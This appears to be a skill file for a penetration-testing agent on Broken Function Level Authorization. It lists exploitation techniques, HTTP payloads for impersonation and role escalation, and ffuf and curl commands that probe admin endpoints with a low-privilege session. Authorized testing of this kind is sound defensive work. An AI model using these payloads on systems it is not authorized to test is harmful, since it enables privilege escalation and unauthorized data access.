---
name: bfla
description: Broken Function Level Authorization (BFLA) — direct invocation of admin/privileged API functions by lower-privilege users. Use when the app separates admin and user APIs but relies on UI hiding rather than server-side authorization.
category: authn-authz
---

# Broken Function Level Authorization (BFLA)

## Detection
- Discover privileged endpoints: admin UI JS bundles, swagger (scan for `admin` paths), role-based menu, sourcemaps, app.js, robots.
- Identify the user-level session that can call them.
- Test each privileged endpoint with a low-privilege (and unauthenticated) session.

## Exploitation
1. **Direct admin API call**: `GET /api/admin/users`, `GET /api/admin/config` from a normal user session.
2. **Verb tampering**: `GET /admin/users` blocked but `POST /admin/users` or `PUT` allowed; or `/user/` vs `/users/` typo variants.
3. **Hidden methods**: admin endpoints served on different subdomain/path prefixes (`/api/v2/admin`, `/internal`).
4. **Parameter-based function**: `?role=admin` switching; `X-Role: admin` header acceptance.
5. **Mass function enum**: ffuf `admin` wordlist against API base with low-priv cookie.

## Payloads
```
GET /api/admin/users
GET /api/v1/internal/users
POST /api/admin/impersonate {"user":"victim"}
GET /admin/config
PUT /user/setRole {"role":"admin"}
```

## Tool Commands
```powershell
# enumerate admin paths with low-priv session
ffuf -w admin-paths.txt -u "$U/FUZZ" -H 'Cookie: sess=<lowpriv>' -mc 200,201,403 -o bfla.json
# verify function executes
curl.exe -s -X GET "$U/api/admin/users" -H 'Cookie: sess=<lowpriv>' | python -m json.tool
```

## Verification & Evidence
- Proof = low-priv session successfully executes a privileged function (list users, read config, modify data).
- Record the exact endpoint, session used, and impact.